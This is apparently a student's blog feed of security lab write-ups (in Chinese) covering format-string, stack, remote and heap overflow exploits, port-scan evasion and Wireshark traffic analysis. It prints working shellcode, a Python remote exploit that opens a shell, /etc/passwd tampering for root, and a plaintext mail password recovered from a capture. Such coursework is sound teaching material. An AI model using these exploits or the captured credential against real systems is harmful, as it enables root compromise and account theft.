<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-11-02T15:21:02.866Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全攻防综合实验7</title>
    <link href="http://yoursite.com/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/"/>
    <id>http://yoursite.com/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/</id>
    <published>2021-11-02T07:35:39.000Z</published>
    <updated>2021-11-02T15:21:02.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h3><p><strong>设置环境变量</strong></p><pre><code class="hljs perl">perl -e <span class="hljs-string">'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";'</span> &gt; shellcode1.binexport SHELLCODE=<span class="hljs-string">`perl -e 'print "\x90"x100;'`</span><span class="hljs-string">`cat shellcode1.bin`</span></code></pre><p><strong>查看环境变量存储位置</strong></p><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/2.png" srcset="/img/loading.gif" alt="2"></p><p>之后编译并且运行<code>get_env</code>，查看环境变量所在位置</p><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/1.png" srcset="/img/loading.gif" alt="1"></p><p>利用格式化字符 <code>%hhn</code> 逐字节修改返回地址为 <code>0xffffd7a4</code> 。</p><pre><code class="hljs c">./fmt_str `<span class="hljs-built_in">printf</span> <span class="hljs-string">"\x10\x34\xff\xff\x11\x34\xff\xff\x12\x34\xff\xff\x13\x34\xff\xff"</span>`%<span class="hljs-number">3</span>\$<span class="hljs-number">148</span>x%<span class="hljs-number">4</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">51</span>x%<span class="hljs-number">5</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">40</span>x%<span class="hljs-number">6</span>\$hhn%<span class="hljs-number">7</span>\$hhn</code></pre><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/3.png" srcset="/img/loading.gif" alt="3"></p><p>可以得到 text 的地址为 <code>0xffffd130</code> ，因此返回地址所在的地址为 <code>0xffffd130</code> + <code>0x40c</code> = <code>0xffffd53c</code></p><p>之后构造<code>payload</code></p><pre><code class="hljs c">./fmt_str `<span class="hljs-built_in">printf</span> <span class="hljs-string">"\x3c\xd5\xff\xff\x3d\xd5\xff\xff\x3e\xd5\xff\xff\x3f\xd5\xff\xff"</span>`%<span class="hljs-number">3</span>\$<span class="hljs-number">148</span>x%<span class="hljs-number">4</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">51</span>x%<span class="hljs-number">5</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">40</span>x%<span class="hljs-number">6</span>\$hhn%<span class="hljs-number">7</span>\$hhn</code></pre><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/4.png" srcset="/img/loading.gif" alt="4"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Format-String&quot;&gt;&lt;a href=&quot;#Format-String&quot; class=&quot;headerlink&quot; title=&quot;Format String&quot;&gt;&lt;/a&gt;Format String&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;设置环境变量&lt;/strong&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="安全攻防综合实验" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>安全攻防综合实验六</title>
    <link href="http://yoursite.com/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/"/>
    <id>http://yoursite.com/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/</id>
    <published>2021-10-26T11:05:03.000Z</published>
    <updated>2021-10-26T11:29:23.834Z</updated>
    
    <content type="html"><![CDATA[<h2 id="remote-buffer-overflow"><a href="#remote-buffer-overflow" class="headerlink" title="remote buffer-overflow"></a>remote buffer-overflow</h2><h3 id="principal"><a href="#principal" class="headerlink" title="principal"></a>principal</h3><p>在<code>remote serve</code>上面运行着<code>echo_serve</code>文件，然后该文件是具有栈溢出漏洞的，当我们输入的字符串给<code>remote serve</code>的时候，就有可能会造成缓冲区溢出，从而获得<code>root</code>权限</p><h3 id="procedure"><a href="#procedure" class="headerlink" title="procedure"></a>procedure</h3><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> times = socket(AF_INET, SOCK_STREAM) s.connect((<span class="hljs-string">"10.12.202.3"</span>, <span class="hljs-number">5050</span>))shellcode= <span class="hljs-string">"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"</span>\ <span class="hljs-string">"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"</span>\ <span class="hljs-string">"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"</span>\ <span class="hljs-string">"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"</span>\ <span class="hljs-string">"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"</span>\ <span class="hljs-string">"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"</span>\ <span class="hljs-string">"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"</span>\ <span class="hljs-string">"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"</span>\ <span class="hljs-string">"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"</span>\ <span class="hljs-string">"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"</span>\ <span class="hljs-string">"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"</span>\ <span class="hljs-string">"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff"</span>nop = <span class="hljs-string">"\x90"</span>*<span class="hljs-number">300</span>ret = <span class="hljs-string">"\x42\xd3\xff\xff"</span>*<span class="hljs-number">100</span>buffer=ret+nop+shellcodes.send(buffer)time.sleep(<span class="hljs-number">2</span>) s.close()s = socket(AF_INET, SOCK_STREAM) s.connect((<span class="hljs-string">"10.12.202.3"</span>, <span class="hljs-number">5050</span>))s.send(<span class="hljs-string">"end\n"</span>)time.sleep(<span class="hljs-number">2</span>) s.close()</code></pre><p>根据程序的返回信息可以得知<code>send_buf</code>的起始位置，而其中的<code>ret</code>只需要落在<code>NOP</code>指令所在位置就可以往后面继续跳转</p><p><img src="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/2.png" srcset="/img/loading.gif" alt="2"></p><p><img src="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/3.png" srcset="/img/loading.gif" alt="3"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;remote-buffer-overflow&quot;&gt;&lt;a href=&quot;#remote-buffer-overflow&quot; class=&quot;headerlink&quot; title=&quot;remote buffer-overflow&quot;&gt;&lt;/a&gt;remote buffer-overfl</summary>
      
    
    
    
    
    <category term="安全攻防综合" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>安全攻防综合实验5</title>
    <link href="http://yoursite.com/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/"/>
    <id>http://yoursite.com/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/</id>
    <published>2021-10-19T06:45:50.000Z</published>
    <updated>2021-10-19T07:20:36.267Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/1.png" srcset="/img/loading.gif" alt="1"></p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>首先先来看源代码，可以看到会把输入进来的一串字符串给到<code>buf</code>，所以我们需要做的就是，让这个字符串包含<code>shellcode</code>，除此之外，实际上要得到的是<code>shellcode</code>的起始位置，然后将存储着<code>main</code>的<code>return address</code>的位置进行覆盖，实现跳转到<code>shellcode</code>起始位置，同时，由于<code>NOP</code>指令的存在（），并不需要获取准确的位置</p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/3.png" srcset="/img/loading.gif" alt="3"></p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/2.png" srcset="/img/loading.gif" alt="2"></p><p>之后，需要来看一下shellcode的长度</p><pre><code class="hljs taggerscript">"<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>4e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>dc<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff/bin/sh"</code></pre><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/4.png" srcset="/img/loading.gif" alt="4"></p><p>可以看到长度为45，然后我们需要开始构造输入的字符串，注意，要保证<code>NOP</code>指令数量加上<code>shellcode</code>的长度是4字节倍数，否则<code>return address</code>对不齐</p><p>另外通过程序输出来找到buf的起始位置，可以看到起始位置是ffffd11c</p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/5.png" srcset="/img/loading.gif" alt="5"></p><p>输入下面指令并运行，获得root权限</p><p><img src="/2021/10/19/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C5/6.png" srcset="/img/loading.gif" alt="6"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;栈溢出&quot;&gt;&lt;a href=&quot;#栈溢出&quot; class=&quot;headerlink&quot; title=&quot;栈溢出&quot;&gt;&lt;/a&gt;栈溢出&lt;/h2&gt;&lt;h3 id=&quot;background&quot;&gt;&lt;a href=&quot;#background&quot; class=&quot;headerlink&quot; title=&quot;b</summary>
      
    
    
    
    
    <category term="安全攻防综合实验" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>安全攻防综合实验4</title>
    <link href="http://yoursite.com/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/"/>
    <id>http://yoursite.com/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/</id>
    <published>2021-10-12T14:54:42.000Z</published>
    <updated>2021-10-12T15:55:09.228Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用堆溢出修改文件"><a href="#利用堆溢出修改文件" class="headerlink" title="利用堆溢出修改文件"></a>利用堆溢出修改文件</h2><h3 id="Principal"><a href="#Principal" class="headerlink" title="Principal"></a>Principal</h3><p><img src="/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/1.png" srcset="/img/loading.gif" alt="1"></p><p>关于set-uid程序参考之前的blog</p><h3 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h3><p>首先，vim看一下对应的<code>heap.c</code>文件</p><p><img src="/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/2.png" srcset="/img/loading.gif" alt="2"></p><p>可以看到userinput是在低地址位置，然后outputfile是在高地址位置，注意，malloc分配并不是只分配了20个byte，需要保持对齐，参考PPT</p><p>然后目标是在进行写入的时候使得在高地址上面的时候能够指向/etc/passwd，创建临时文件/tmp/etc/passwd并需要创建符号链接</p><p><img src="/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/3.png" srcset="/img/loading.gif" alt="3"></p><p>然后开始构造，运行命令</p><pre><code class="hljs elixir">./heap haolong::0<span class="hljs-symbol">:</span>0<span class="hljs-symbol">:</span><span class="hljs-number">12345</span><span class="hljs-symbol">:/tmp/etc/passwd</span></code></pre><p><img src="/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/4.png" srcset="/img/loading.gif" alt="4"></p><p>然后切换到对应用户并且whoami查看，获得root权限</p><p><img src="/2021/10/12/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C4/5.png" srcset="/img/loading.gif" alt="5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用堆溢出修改文件&quot;&gt;&lt;a href=&quot;#利用堆溢出修改文件&quot; class=&quot;headerlink&quot; title=&quot;利用堆溢出修改文件&quot;&gt;&lt;/a&gt;利用堆溢出修改文件&lt;/h2&gt;&lt;h3 id=&quot;Principal&quot;&gt;&lt;a href=&quot;#Principal&quot; class</summary>
      
    
    
    
    
    <category term="安全攻防综合实验" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>安全攻防综合实验3</title>
    <link href="http://yoursite.com/2021/10/08/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C3/"/>
    <id>http://yoursite.com/2021/10/08/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C3/</id>
    <published>2021-10-08T13:26:17.000Z</published>
    <updated>2021-10-08T13:43:15.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><h3 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h3><ul><li>Target：当被扫描端口收到<code>SYN</code>数据包的时候，返回一个<code>SYN+ACK</code>数据包给源主机，同时过滤<code>RST</code>数据包。</li><li>Python：</li></ul><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> * <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process</span><span class="hljs-params">(pkt)</span>:</span>     IP_src = pkt[IP].src     IP_dst = pkt[IP].dst     TCP_sport = pkt[TCP].sport     TCP_dport = pkt[TCP].dport     TCP_seq = pkt[TCP].seq     TCP.ack = pkt[TCP].ack     <span class="hljs-comment">#对应的源主机端口信息的获取</span>    send_pkt = IP(src = IP_dst, dst = IP_src) / TCP(dport = TCP_sport, sport = TCP_dport, ack = TCP_seq + <span class="hljs-number">1</span>, flags = <span class="hljs-string">"SA"</span>)     <span class="hljs-comment">#发送数据包</span>    send(send_pkt)     sniff(filter = <span class="hljs-string">"tcp[tcpflags] &amp; (tcp-syn) != 0 and tcp[tcpflags] &amp; (tcp-ack) == 0"</span>, prn = process)<span class="hljs-comment">#进行过滤</span></code></pre><p>通过嗅探函数来进行过滤并且抓取对应的<code>SYN</code>数据包，回复的<code>SYN+ACK</code>数据包构造如下：从抓取到的数据包当中获取源主机的IP以及端口号，之后ACK 号为抓取包的序列号加 1 。同时需要重新设置防火墙，过滤掉系统自动返回的 RST 数据包：</p><pre><code class="hljs properties"><span class="hljs-attr">iptables</span> <span class="hljs-string">-F </span><span class="hljs-attr">iptables</span> <span class="hljs-string">-P INPUT ACCEPt </span><span class="hljs-attr">iptables</span> <span class="hljs-string">-A OUTPUT -p tcp --tcp-flags RST RST -j DROP</span></code></pre><p>之后使用zenmap来进行扫描：</p><p><img src="/2021/10/08/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C3/1.PNG" srcset="/img/loading.gif" alt="1"></p><h3 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h3><p>通过过滤掉 <code>ICMP port unreachable</code> 数据包，来使扫描方无法判断端口是否开放。</p><p>使用防火墙来进行过滤</p><pre><code class="hljs gauss">iptables -A <span class="hljs-keyword">OUTPUT</span> -p icmp --icmp-<span class="hljs-built_in">type</span> <span class="hljs-number">3</span> -j <span class="hljs-built_in">DROP</span></code></pre><p>之后还是使用zenmap来进行扫描</p><p><img src="/2021/10/08/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C3/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以看到处于<code>ignore state</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络扫描&quot;&gt;&lt;a href=&quot;#网络扫描&quot; class=&quot;headerlink&quot; title=&quot;网络扫描&quot;&gt;&lt;/a&gt;网络扫描&lt;/h2&gt;&lt;p align=&quot;right&quot;&gt;姓名：贾昊龙
&lt;/p&gt;&lt;p align=&quot;right&quot;&gt;学号：18307130049

&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="安全攻防综合" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>安全综合攻防实验2</title>
    <link href="http://yoursite.com/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/"/>
    <id>http://yoursite.com/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/</id>
    <published>2021-09-22T02:41:34.000Z</published>
    <updated>2021-09-28T15:29:10.655Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安全综合攻防实验2"><a href="#安全综合攻防实验2" class="headerlink" title="安全综合攻防实验2"></a>安全综合攻防实验2</h2><h3 id="Webmail"><a href="#Webmail" class="headerlink" title="Webmail"></a>Webmail</h3><ul><li>获得基本信息</li></ul><table><thead><tr><th align="center">收件人邮箱</th><th align="center"><a href="mailto:cwu@fudan.edu.cn">cwu@fudan.edu.cn</a></th></tr></thead><tbody><tr><td align="center"><strong>发件人邮箱</strong></td><td align="center"><a href="mailto:13601927008@sina.cn">13601927008@sina.cn</a></td></tr><tr><td align="center"><strong>邮件标题</strong></td><td align="center">Test mail</td></tr><tr><td align="center"><strong>邮件正文</strong></td><td align="center">这是一个发往新浪邮箱的测试邮件，带附件。<br>吴承荣</td></tr><tr><td align="center"><strong>用户名</strong></td><td align="center">cwu</td></tr><tr><td align="center"><strong>口令</strong></td><td align="center">ABC12345XYZ</td></tr></tbody></table><ul><li>第一封邮件</li></ul><table><thead><tr><th align="center"><strong>发件⼈邮箱</strong></th><th align="center"><strong><a href="mailto:cwu@fudan.edu.cn">cwu@fudan.edu.cn</a></strong></th></tr></thead><tbody><tr><td align="center"><strong>收件⼈邮</strong></td><td align="center"><strong><a href="mailto:13601927008@sina.cn">13601927008@sina.cn</a></strong></td></tr><tr><td align="center"><strong>邮件标题</strong></td><td align="center"><strong>Test+mail+1</strong></td></tr><tr><td align="center"><strong>邮件正⽂</strong></td><td align="center"><strong>这是⼀个发往新浪邮箱的测试邮件，带附件。吴承荣</strong></td></tr><tr><td align="center"><strong>附件</strong></td><td align="center"><strong>参考⽹站列表.pdf</strong></td></tr></tbody></table><ul><li>第二封邮件</li></ul><table><thead><tr><th align="center"><strong>发件⼈邮箱</strong></th><th align="center"><strong><a href="mailto:13601927008@sina.cn">13601927008@sina.cn</a></strong></th></tr></thead><tbody><tr><td align="center"><strong>收件⼈邮箱</strong></td><td align="center"><strong><a href="mailto:cwu@fudan.edu.cn">cwu@fudan.edu.cn</a></strong></td></tr><tr><td align="center"><strong>邮件标题</strong></td><td align="center"><strong>课程测试邮件</strong></td></tr><tr><td align="center"><strong>附件</strong></td><td align="center"><strong>IP基础题.docx</strong></td></tr><tr><td align="center"><strong>邮件正⽂</strong></td><td align="center"><strong>这是⼀个课程测试邮件。请查收。</strong></td></tr></tbody></table><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>使用wireshark追踪TCP流并且使用UTF-8J解码，之后通过流的信息来看</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以看到有对应的一些信息，同时通过在线解码工具来解码选中的部分</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/3.PNG" srcset="/img/loading.gif" alt="3"></p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>之后进行搜索关键字，并且将对应的return Info进行解码</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>同理，通过关键词搜索找到第二封邮件，可以看到名为“课程测试邮件”</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>之后查找docx可以看到名为“IP基础题”的附件</p><p>之后将所有文件进行导出，会看到有一个有docx出现，解码后docx前面是IP基础题，将名字docx后面的删去</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>同样，还原另一个参考网站列表.pdf</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/9.PNG" srcset="/img/loading.gif" alt="9"></p><p>之后在还原页面的时候直接将对应的HTML代码复制到VS code就行</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/10.PNG" srcset="/img/loading.gif" alt="10"></p><h3 id="ftpexample"><a href="#ftpexample" class="headerlink" title="ftpexample"></a>ftpexample</h3><p>同上面，先追踪流，并在GBK模式下进行</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/11.PNG" srcset="/img/loading.gif" alt="11"></p><p>⾥看到客户向服务器指定传输⽂件的端⼝：172.16.168.21是ip地址，⽽端⼝号为192 x 256 + 27=49179 </p><p>之后进行过滤并且导出为PPTX文件，内容如下：</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/12.PNG" srcset="/img/loading.gif" alt="12"></p><p>docx方式同理</p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/13.PNG" srcset="/img/loading.gif" alt="13"></p><p><img src="/2021/09/22/%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C2/14.PNG" srcset="/img/loading.gif" alt="14"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安全综合攻防实验2&quot;&gt;&lt;a href=&quot;#安全综合攻防实验2&quot; class=&quot;headerlink&quot; title=&quot;安全综合攻防实验2&quot;&gt;&lt;/a&gt;安全综合攻防实验2&lt;/h2&gt;&lt;h3 id=&quot;Webmail&quot;&gt;&lt;a href=&quot;#Webmail&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="安全攻防综合实验" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>安全攻防综合实验一</title>
    <link href="http://yoursite.com/2021/09/15/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
    <id>http://yoursite.com/2021/09/15/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E4%B8%80/</id>
    <published>2021-09-15T02:28:24.000Z</published>
    <updated>2021-10-08T13:27:41.651Z</updated>
    
